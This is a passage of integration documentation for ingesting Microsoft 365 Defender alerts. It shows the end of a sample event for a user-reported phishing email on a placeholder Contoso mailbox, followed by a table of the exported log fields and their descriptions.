        "created": "2020-09-06T12:07:55.1366667Z",
        "dataset": "m365_defender.log",
        "duration": 0,
        "end": "2020-09-06T12:04:00Z",
        "id": "faf8edc936-85f8-a603-b800-08d8525cf099",
        "ingested": "2024-01-17T16:06:28Z",
        "kind": "alert",
        "original": "{\"alerts\":{\"actorName\":null,\"alertId\":\"faf8edc936-85f8-a603-b800-08d8525cf099\",\"assignedTo\":\"Automation\",\"category\":\"InitialAccess\",\"classification\":null,\"creationTime\":\"2020-09-06T12:07:54.3716642Z\",\"description\":\"This alert is triggered when any email message is reported as malware or phish by users -V1.0.0.2\",\"detectionSource\":\"OfficeATP\",\"determination\":null,\"devices\":[],\"entities\":{\"aadUserId\":null,\"accountName\":null,\"clusterBy\":null,\"deliveryAction\":null,\"deviceId\":null,\"domainName\":null,\"entityType\":\"MailBox\",\"fileName\":null,\"filePath\":null,\"ipAddress\":null,\"mailboxAddress\":\"testUser3@contoso.com\",\"mailboxDisplayName\":\"test User3\",\"parentProcessCreationTime\":null,\"parentProcessId\":null,\"processCommandLine\":null,\"processCreationTime\":null,\"processId\":null,\"recipient\":null,\"registryHive\":null,\"registryKey\":null,\"registryValue\":null,\"registryValueType\":null,\"securityGroupId\":null,\"securityGroupName\":null,\"sender\":null,\"sha1\":null,\"sha256\":null,\"subject\":null,\"url\":null,\"userPrincipalName\":\"testUser3@contoso.com\",\"userSid\":null},\"firstActivity\":\"2020-09-06T12:04:00Z\",\"incidentId\":924518,\"investigationId\":null,\"investigationState\":\"Queued\",\"lastActivity\":\"2020-09-06T12:04:00Z\",\"lastUpdatedTime\":\"2020-09-06T12:37:40.88Z\",\"mitreTechniques\":[],\"resolvedTime\":null,\"serviceSource\":\"OfficeATP\",\"severity\":\"Informational\",\"status\":\"InProgress\",\"threatFamilyName\":null,\"title\":\"Email reported by user as malware or phish\"},\"assignedTo\":null,\"classification\":\"Unknown\",\"comments\":[],\"createdTime\":\"2020-09-06T12:07:55.1366667Z\",\"determination\":\"NotAvailable\",\"incidentId\":924518,\"incidentName\":\"Email reported by user as malware or phish\",\"lastUpdateTime\":\"2020-09-06T12:07:55.32Z\",\"redirectIncidentId\":null,\"severity\":\"Informational\",\"status\":\"Active\",\"tags\":[]}",
        "provider": "OfficeATP",
        "severity": 1,
        "start": "2020-09-06T12:04:00Z",
        "timezone": "UTC",
        "type": [
            "info"
        ]
    },
    "file": {
        "hash": {}
    },
    "input": {
        "type": "httpjson"
    },
    "m365_defender": {
        "alerts": {
            "assignedTo": "Automation",
            "creationTime": "2020-09-06T12:07:54.3716642Z",
            "detectionSource": "OfficeATP",
            "entities": {
                "entityType": "MailBox",
                "mailboxAddress": "testUser3@contoso.com",
                "mailboxDisplayName": "test User3"
            },
            "incidentId": "924518",
            "investigationState": "Queued",
            "lastUpdatedTime": "2020-09-06T12:37:40.88Z",
            "severity": "Informational",
            "status": "InProgress"
        },
        "classification": "Unknown",
        "determination": "NotAvailable",
        "incidentId": "924518",
        "incidentName": "Email reported by user as malware or phish",
        "status": "Active"
    },
    "message": "Email reported by user as malware or phish",
    "observer": {
        "name": "OfficeATP",
        "product": "365 Defender",
        "vendor": "Microsoft"
    },
    "process": {
        "parent": {}
    },
    "related": {
        "user": [
            "testUser3@contoso.com"
        ]
    },
    "rule": {
        "description": "This alert is triggered when any email message is reported as malware or phish by users -V1.0.0.2"
    },
    "tags": [
        "preserve_original_event",
        "m365_defender",
        "forwarded"
    ],
    "threat": {
        "framework": "MITRE ATT&CK",
        "technique": {
            "name": [
                "InitialAccess"
            ]
        }
    },
    "user": {
        "name": "testUser3@contoso.com"
    }
}
```

**Exported fields**

| Field | Description | Type |
|---|---|---|
| @timestamp | Event timestamp. | date |
| cloud.account.id | The cloud account or organization id used to identify different entities in a multi-tenant environment. Examples: AWS account id, Google Cloud ORG Id, or other unique identifier. | keyword |
| cloud.availability_zone | Availability zone in which this host is running. | keyword |
| cloud.image.id | Image ID for the cloud instance. | keyword |
| cloud.instance.id | Instance ID of the host machine. | keyword |
| cloud.instance.name | Instance name of the host machine. | keyword |
| cloud.machine.type | Machine type of the host machine. | keyword |
| cloud.project.id | Name of the project in Google Cloud. | keyword |
| cloud.provider | Name of the cloud provider. Example values are aws, azure, gcp, or digitalocean. | keyword |
| cloud.region | Region in which this host is running. | keyword |
| container.id | Unique container id. | keyword |
| container.image.name | Name of the image the container was built on. | keyword |
| container.labels | Image labels. | object |
| container.name | Container name. | keyword |
| data_stream.dataset | Data stream dataset. | constant_keyword |
| data_stream.namespace | Data stream namespace. | constant_keyword |
| data_stream.type | Data stream type. | constant_keyword |
| ecs.version | ECS version this event conforms to. `ecs.version` is a required field and must exist in all events. When querying across multiple indices -- which may conform to slightly different ECS versions -- this field lets integrations adjust to the schema version of the events. | keyword |
| error.message | Error message. | match_only_text |
| event.action | The action captured by the event. This describes the information in the event. It is more specific than `event.category`. Examples are `group-add`, `process-started`, `file-created`. The value is normally defined by the implementer. | keyword |
| event.category | This is one of four ECS Categorization Fields, and indicates the second level in the ECS category hierarchy. `event.category` represents the "big buckets" of ECS categories. For example, filtering on `event.category:process` yields all events relating to process activity. This field is closely related to `event.type`, which is used as a subcategory. This field is an array. This will allow proper categorization of some events that fall in multiple categories. | keyword |
| event.created | `event.created` contains the date/time when the event was first read by an agent, or by your pipeline. This field is distinct from `@timestamp` in that `@timestamp` typically contain the time extracted from the original event. In most situations, these two timestamps will be slightly different. The difference can be used to calculate the delay between your source generating an event, and the time when your agent first processed it. This can be used to monitor your agent's or pipeline's ability to keep up with your event source. In case the two timestamps are identical, `@timestamp` should be used. | date |
| event.dataset | Event dataset | constant_keyword |
| event.end | `event.end` contains the date when the event ended or when the activity was last observed. | date |
| event.id | Unique ID to describe the event. | keyword |
| event.kind | This is one of four ECS Categorization Fields, and indicates the highest level in the ECS category hierarchy. `event.kind` gives high-level information about what type of information the event contains, without being specific to the contents of the event. For example, values of this field distinguish alert events from metric events. The value of this field can be used to inform how these kinds of events should be handled. They may warrant different retention, different access control, it may also help understand whether the data is coming in at a regular interval or not. | keyword |
| event.module | Event module | constant_keyword |
| event.provider | Source of the event. Event transports such as Syslog or the Windows Event Log typically mention the source of an event. It can be the name of the software that generated the event (e.g. Sysmon, httpd), or of a subsystem of the operating system (kernel, Microsoft-Windows-Security-Auditing). | keyword |
| event.severity | The numeric severity of the event according to your event source. What the different severity values mean can be different between sources and use cases. It's up to the implementer to make sure severities are consistent across events from the same source. The Syslog severity belongs in `log.syslog.severity.code`. `event.severity` is meant to represent the severity according to the event source (e.g. firewall, IDS). If the event source does not publish its own severity, you may optionally copy the `log.syslog.severity.code` to `event.severity`. | long |
| event.start | `event.start` contains the date when the event started or when the activity was first observed. | date |
| event.timezone | This field should be populated when the event's timestamp does not include timezone information already (e.g. default Syslog timestamps). It's optional otherwise. Acceptable timezone formats are: a canonical ID (e.g. "Europe/Amsterdam"), abbreviated (e.g. "EST") or an HH:mm differential (e.g. "-05:00"). | keyword |
| event.type | This is one of four ECS Categorization Fields, and indicates the third level in the ECS category hierarchy. `event.type` represents a categorization "sub-bucket" that, when used along with the `event.category` field values, enables filtering events down to a level appropriate for single visualization. This field is an array. This will allow proper categorization of some events that fall in multiple event types. | keyword |
| file.hash.sha1 | SHA1 hash. | keyword |
| file.hash.sha256 | SHA256 hash. | keyword |
| file.name | Name of the file including the extension, without the directory. | keyword |
| file.path | Full path to the file, including the file name. It should include the drive letter, when appropriate. | keyword |
| file.path.text | Multi-field of `file.path`. | match_only_text |
| host.architecture | Operating system architecture. | keyword |
| host.containerized | If the host is a container. | boolean |
| host.domain | Name of the domain of which the host is a member. For example, on Windows this could be the host's Active Directory domain or NetBIOS domain name. For Linux this could be the domain of the host's LDAP provider. | keyword |
| host.hostname | Hostname of the host. It normally contains what the `hostname` command returns on the host machine. | keyword |
| host.id | Unique host id. As hostname is not always unique, use values that are meaningful in your environment. Example: The current usage of `beat.name`. | keyword |
| host.ip | Host ip addresses. | ip |
| host.mac | Host mac addresses. | keyword |
| host.name | Name of the host. It can contain what `hostname` returns on Unix systems, the fully qualified domain name, or a name specified by the user. The sender decides which value to use. | keyword |
| host.os.build | OS build information. | keyword |
| host.os.codename | OS codename, if any. | keyword |
| host.os.family | OS family (such as redhat, debian, freebsd, windows). | keyword |
| host.os.kernel | Operating system kernel version as a raw string. | keyword |
| host.os.name | Operating system name, without the version. | keyword |
| host.os.name.text | Multi-field of `host.os.name`. | text |
| host.os.platform | Operating system platform (such centos, ubuntu, windows). | keyword |
| host.os.version | Operating system version as a raw string. | keyword |
| host.type | Type of host. For Cloud providers this can be the machine type like `t2.medium`. If vm, this could be the container, for example, or other information meaningful in your environment. | keyword |
| input.type | Input type | keyword |
| log.offset | Log offset | long |
| m365_defender.alerts.actorName | The activity group, if any, the associated with this alert. | keyword |
| m365_defender.alerts.assignedTo | Owner of the incident, or null if no owner is assigned. | keyword |
| m365_defender.alerts.classification | The specification for the incident. The property values are: Unknown, FalsePositive, TruePositive or null. | keyword |
| m365_defender.alerts.creationTime | Time when alert was first created. | date |
| m365_defender.alerts.detectionSource | The service that initially detected the threat. | keyword |
| m365_defender.alerts.detectorId | The detector id. | keyword |
| m365_defender.alerts.determination | Specifies the determination of the incident. The property values are: NotAvailable, Apt, Malware, SecurityPersonnel, SecurityTesting, UnwantedSoftware, Other or null. | keyword |
| m365_defender.alerts.devices | The devices related to the investigation. | flattened |
| m365_defender.alerts.entities.accountName | Account name of the related user. | keyword |
| m365_defender.alerts.entities.clusterBy | A list of metadata if the entityType is MailCluster. | keyword |
| m365_defender.alerts.entities.deliveryAction | The delivery status for the related email message. | keyword |
| m365_defender.alerts.entities.deviceId | The unique ID of the device related to the event. | keyword |
| m365_defender.alerts.entities.entityType | Entities that have been identified to be part of, or related to, a given alert. The properties values are: User, Ip, Url, File, Process, MailBox, MailMessage, MailCluster, Registry. | keyword |
| m365_defender.alerts.entities.evidenceCreationTime | The evidence creation time. | date |
| m365_defender.alerts.entities.ipAddress | The related IP address to the event. | keyword |
| m365_defender.alerts.entities.mailboxAddress | The mail address of the related mailbox. | keyword |
| m365_defender.alerts.entities.mailboxDisplayName | The display name of the related mailbox. | keyword |
| m365_defender.alerts.entities.recipient | The recipient for the related email message. | keyword |
| m365_defender.alerts.entities.registryHive | Reference to which Hive in registry the event is related to, if eventType is registry. Example: HKEY_LOCAL_MACHINE. | keyword |
| m365_defender.alerts.entities.registryKey | Reference to the related registry key to the event. | keyword |
| m365_defender.alerts.entities.registryValueType | Value type of the registry key/value pair related to the event. | keyword |
| m365_defender.alerts.entities.remediationStatus | The remediation status. | keyword |
| m365_defender.alerts.entities.securityGroupId | The Security Group ID for the user related to the email message. | keyword |
| m365_defender.alerts.entities.securityGroupName | The Security Group Name for the user related to the email message. | keyword |
| m365_defender.alerts.entities.sender | The sender for the related email message. | keyword |
| m365_defender.alerts.entities.subject | The subject for the related email message. | keyword |
| m365_defender.alerts.entities.userSid | The event user Sid. | keyword |
| m365_defender.alerts.entities.verdict | The event verdict. | keyword |
| m365_defender.alerts.incidentId | Unique identifier to represent the incident this alert is associated with. | keyword |
| m365_defender.alerts.investigationId | The automated investigation id triggered by this alert. | keyword |
| m365_defender.alerts.investigationState | Information on the investigation's current status. | keyword |
| m365_defender.alerts.lastUpdatedTime | Time when alert was last updated. | date |
| m365_defender.alerts.mitreTechniques | The attack techniques, as aligned with the MITRE ATT&CK™ framework. | keyword |
| m365_defender.alerts.providerAlertId | The provider alert id. | keyword |
| m365_defender.alerts.resolvedTime | Time when alert was resolved. | date |
| m365_defender.alerts.severity | The severity of the related alert. | keyword |
| m365_defender.alerts.status | Categorize alerts (as New, Active, or Resolved). | keyword |
| m365_defender.alerts.threatFamilyName | Threat family associated with this alert. | keyword |
| m365_defender.alerts.userSid | The SID of the related user. | keyword |
| m365_defender.assignedTo | Owner of the alert. | keyword |
| m365_defender.classification | Specification of the alert. Possible values are: 'Unknown', 'FalsePositive', 'TruePositive'. | keyword |
| m365_defender.comments | Comments attached to the related incident. | flattened |
| m365_defender.determination | Specifies the determination of the incident. The property values are: NotAvailable, Apt, Malware, SecurityPersonnel, SecurityTesting, UnwantedSoftware, Other. | keyword |
| m365_defender.incidentId | Unique identifier to represent the incident. | keyword |
| m365_defender.incidentName | Name of the Incident. | keyword |
| m365_defender.incidentUri | The incident URI. | keyword |
| m365_defender.investigationState | The current state of the Investigation. | keyword |
| m365_defender.redirectIncidentId | Only populated in case an incident is being grouped together with another incident, as part of the incident processing logic. | keyword |
| m365_defender.status | Specifies the current status of the alert. Possible values are: 'Unknown', 'New', 'InProgress' and 'Resolved'. | keyword |
| m365_defender.tags | Array of custom tags associated with an incident, for example to flag a group of incidents with a common characteristic. | keyword |
| message | For log events the message field contains the log message, optimized for viewing in a log viewer. For structured logs without an original message field, other fields can be concatenated to form a human-readable summary of the event. If multiple messages exist, they can be combined into one message. | match_only_text |
| observer.name | Custom name of the observer. This is a name that can be given to an observer. This can be helpful for example if multiple firewalls of the same model are used in an organization. If no custom name is needed, the field can be left empty. | keyword |
| observer.product | The product name of the observer. | keyword |
| observer.vendor | Vendor name of the observer. | keyword |
| process.command_line | Full command line that started the process, including the absolute path to the executable, and all arguments. Some arguments may be filtered to protect sensitive information. | wildcard |
| process.command_line.text | Multi-field of `process.command_line`. | match_only_text |
| process.parent.pid | Process id. | long |
| process.parent.start | The time the process started. | date |
| process.pid | Process id. | long |
| process.start | The time the process started. | date |
| related.hash | All the hashes seen on your event. Populating this field, then using it to search for hashes can help in situations where you're unsure what the hash algorithm is (and therefore which key name to search). | keyword |
| related.hosts | All hostnames or other host identifiers seen on your event. Example identifiers include FQDNs, domain names, workstation names, or aliases. | keyword |
| related.ip | All of the IPs seen on your event. | ip |
| related.user | All the user names or other user identifiers seen on the event. | keyword |
| rule.description | The description of the rule generating the event. | keyword |
| tags | List of keywords used to tag each event. | keyword |
| threat.framework | Name of the threat framework used to further categorize and classify the tactic and technique of the reported threat. Framework classification can be provided by detecting systems, evaluated at ingest time, or retrospectively tagged to events. | keyword |
| threat.technique.name | The name of technique used by this threat. You can use a MITRE ATT&CK® technique, for example. (ex. https://attack.mitre.org/techniques/T1059/) | keyword |
| threat.technique.name.text | Multi-field of `threat.technique.name`. | match_only_text |
| url.domain | Domain of the url, such as "www.elastic.co". In some cases a URL may refer to an IP and/or port directly, without a domain name. In this case, the IP address would go to the `domain` field. If the URL contains a literal IPv6 address enclosed by `[` and `]` (IETF RFC 2732), the `[` and `]` characters should also be captured in the `domain` field. | keyword |
| url.extension | The field contains the file extension from the original request url, excluding the leading dot. The file extension is only set if it exists, as not every url has a file extension. The leading period must not be included. For example, the value must be "png", not ".png". Note that when the file name has multiple extensions (example.tar.gz), only the last one should be captured ("gz", not "tar.gz"). | keyword |
| url.full | If full URLs are important to your use case, they should be stored in `url.full`, whether this field is reconstructed or present in the event source. | wildcard |
| url.full.text | Multi-field of `url.full`. | match_only_text |
| url.original | Unmodified original url as seen in the event source. Note that in network monitoring, the observed URL may be a full URL, whereas in access logs, the URL is often just represented as a path. This field is meant to represent the URL as it was observed, complete or not. | wildcard |
| url.original.text | Multi-field of `url.original`. | match_only_text |
| url.path | Path of the request, such as "/search". | wildcard |
| url.port | Port of the request, such as 443. | long |
| url.query | The query field describes the query string of the request, such as "q=elasticsearch". The `?` is excluded from the query string. If a URL contains no `?`, there is no query field. If there is a `?` but no query, the query field exists with an empty string. The `exists` query can be used to differentiate between the two cases. | keyword |
| url.scheme | Scheme of the request, such as "https". Note: The `:` is not part of the scheme. | keyword |
| user.domain | Name of the directory the user is a member of. For example, an LDAP or Active Directory domain name. | keyword |
| user.id | Unique identifier of the user. | keyword |
| user.name | Short name or login of the user. | keyword |
| user.name.text | Multi-field of `user.name`. | match_only_text |

